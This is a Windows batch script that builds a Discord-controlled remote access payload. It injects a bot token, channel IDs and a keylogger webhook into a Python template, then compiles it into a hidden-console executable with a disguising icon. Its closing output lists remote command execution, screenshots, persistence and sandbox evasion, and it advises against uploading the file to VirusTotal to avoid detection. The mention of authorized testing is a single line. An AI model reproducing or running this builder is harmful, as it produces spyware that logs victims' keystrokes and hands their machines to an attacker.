@echo off
setlocal enabledelayedexpansion

echo ===============================================
echo Discord C2 Payload Builder - Complete Setup
echo ===============================================
echo.

REM Check if UV is installed
echo [+] Checking UV installation...
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: UV package manager not found!
    echo.
    echo Installing UV automatically...
    powershell -Command "& {Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression}"
    if %errorlevel% neq 0 (
        echo ERROR: Failed to install UV automatically!
        echo Please install UV manually: https://docs.astral.sh/uv/getting-started/installation/
        pause
        exit /b 1
    )
    echo [+] UV installed successfully!
)

REM Check if Python is available
echo [+] Checking Python installation...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Python not found!
    echo Please install Python 3.9 or higher from https://python.org
    pause
    exit /b 1
)

echo [+] Creating virtual environment and installing dependencies...
uv sync
if %errorlevel% neq 0 (
    echo ERROR: Failed to sync dependencies!
    echo Trying to initialize project first...
    uv init --no-readme
    uv sync
    if %errorlevel% neq 0 (
        echo ERROR: Still failed to sync dependencies!
        pause
        exit /b 1
    )
)

echo.
echo ===============================================
echo Configuration Setup
echo ===============================================

REM Default configuration values
set "DEFAULT_NAME=YOUR_PAYLOAD_NAME"
set "DEFAULT_GUILD_ID=YOUR_GUILD_ID"
set "DEFAULT_BOT_TOKEN=YOUR_BOT_TOKEN"
set "DEFAULT_CHANNEL_ID=YOUR_CHANNEL_ID"
set "DEFAULT_WEBHOOK=YOUR_WEBHOOK_URL"

echo Default values loaded:
echo   - Name: %DEFAULT_NAME%
echo   - Guild ID: %DEFAULT_GUILD_ID%
echo   - Channel ID: %DEFAULT_CHANNEL_ID%
echo   - Bot Token: %DEFAULT_BOT_TOKEN:~0,20%...
echo   - Webhook: %DEFAULT_WEBHOOK:~0,50%...
echo.

set /p USE_DEFAULTS="Use default values? (Y/n): "
if /i "%USE_DEFAULTS%"=="n" goto CUSTOM_CONFIG

REM Use default values
set "PAYLOAD_NAME=%DEFAULT_NAME%"
set "GUILD_ID=%DEFAULT_GUILD_ID%"
set "BOT_TOKEN=%DEFAULT_BOT_TOKEN%"
set "CHANNEL_ID=%DEFAULT_CHANNEL_ID%"
set "KEYLOGGER_WEBHOOK=%DEFAULT_WEBHOOK%"
goto BUILD_PAYLOAD

:CUSTOM_CONFIG
echo.
echo Enter custom configuration (press Enter for defaults):
echo.

set /p PAYLOAD_NAME="Payload name [%DEFAULT_NAME%]: "
if "%PAYLOAD_NAME%"=="" set "PAYLOAD_NAME=%DEFAULT_NAME%"

set /p GUILD_ID="Guild ID [%DEFAULT_GUILD_ID%]: "
if "%GUILD_ID%"=="" set "GUILD_ID=%DEFAULT_GUILD_ID%"

set /p BOT_TOKEN="Bot Token [%DEFAULT_BOT_TOKEN:~0,20%...]: "
if "%BOT_TOKEN%"=="" set "BOT_TOKEN=%DEFAULT_BOT_TOKEN%"

set /p CHANNEL_ID="Channel ID [%DEFAULT_CHANNEL_ID%]: "
if "%CHANNEL_ID%"=="" set "CHANNEL_ID=%DEFAULT_CHANNEL_ID%"

set /p KEYLOGGER_WEBHOOK="Webhook URL [%DEFAULT_WEBHOOK:~0,50%...]: "
if "%KEYLOGGER_WEBHOOK%"=="" set "KEYLOGGER_WEBHOOK=%DEFAULT_WEBHOOK%"

:BUILD_PAYLOAD
echo.
echo ===============================================
echo Building Payload
echo ===============================================
echo [+] Configuration:
echo   - Name: %PAYLOAD_NAME%
echo   - Guild ID: %GUILD_ID%
echo   - Channel ID: %CHANNEL_ID%
echo   - Bot Token: %BOT_TOKEN:~0,20%...
echo   - Webhook: %KEYLOGGER_WEBHOOK:~0,50%...
echo.

echo [+] Creating configured payload...

REM Create a copy of the template and replace placeholders
copy discord_payload.py %PAYLOAD_NAME%.py >nul
if %errorlevel% neq 0 (
    echo ERROR: Failed to copy payload template!
    pause
    exit /b 1
)

REM Replace configuration placeholders using PowerShell
echo [+] Configuring payload with your settings...
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{GUILD_ID\}', '%GUILD_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{BOT_TOKEN\}', '%BOT_TOKEN%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{CHANNEL_ID\}', '%CHANNEL_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{KEYLOGGER_WEBHOOK\}', '%KEYLOGGER_WEBHOOK%' | Set-Content '%PAYLOAD_NAME%.py'"

echo [+] Installing PyInstaller...
uv add pyinstaller
if %errorlevel% neq 0 (
    echo ERROR: Failed to install PyInstaller!
    pause
    exit /b 1
)

echo [+] Building executable with PyInstaller...

REM Create dist directory if it doesn't exist
if not exist "dist" mkdir dist

REM Build the executable
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=%PAYLOAD_NAME% --distpath=dist %PAYLOAD_NAME%.py

if %errorlevel% equ 0 (
    echo.
    echo ===============================================
    echo BUILD SUCCESSFUL!
    echo ===============================================
    echo.
    echo ✅ Executable created: dist\%PAYLOAD_NAME%.exe
    echo ✅ Size:
    for %%A in (dist\%PAYLOAD_NAME%.exe) do echo    %%~zA bytes
    echo.
    echo 📋 Configuration Summary:
    echo   - Payload Name: %PAYLOAD_NAME%
    echo   - Guild ID: %GUILD_ID%
    echo   - Channel ID: %CHANNEL_ID%
    echo   - Bot Token: %BOT_TOKEN:~0,20%...
    echo   - Webhook: %KEYLOGGER_WEBHOOK:~0,50%...
    echo.
    echo 🔒 IMPORTANT SECURITY NOTES:
    echo   - DO NOT upload to VirusTotal or similar services
    echo   - Test in isolated environment first
    echo   - Use only for authorized penetration testing
    echo   - Keep your bot token secure
    echo.
    echo 🎯 Discord Bot Commands:
    echo   - /interact ^<id^> - Interact with agent
    echo   - !ls - List active agents
    echo   - /cmd ^<command^> - Execute commands
    echo   - /screenshot - Take screenshot
    echo   - /persistent - Enable persistence
    echo   - /terminate - Terminate agent
    echo.
    echo 🐛 Debug Mode Usage:
    echo   - Run: %PAYLOAD_NAME%.exe -d
    echo   - Shows terminal logs and sends debug hit to Discord
    echo   - Bypasses sandbox evasion for testing
    echo   - Creates debug.log file for troubleshooting
    echo.
    echo ===============================================

    REM Clean up temporary files
    echo [+] Cleaning up temporary files...
    del %PAYLOAD_NAME%.py >nul 2>&1
    del %PAYLOAD_NAME%.spec >nul 2>&1
    if exist "build" rmdir /s /q build >nul 2>&1

    echo [+] Cleanup complete!

) else (
    echo.
    echo ===============================================
    echo BUILD FAILED!
    echo ===============================================
    echo ❌ Check the error messages above for details.
    echo.
    echo Common issues:
    echo   - Missing dependencies
    echo   - Insufficient permissions
    echo   - Antivirus interference
    echo   - Invalid configuration values
    echo.
    echo Try running as administrator or check your antivirus settings.
)

echo.
echo Press any key to exit...
pause >nul
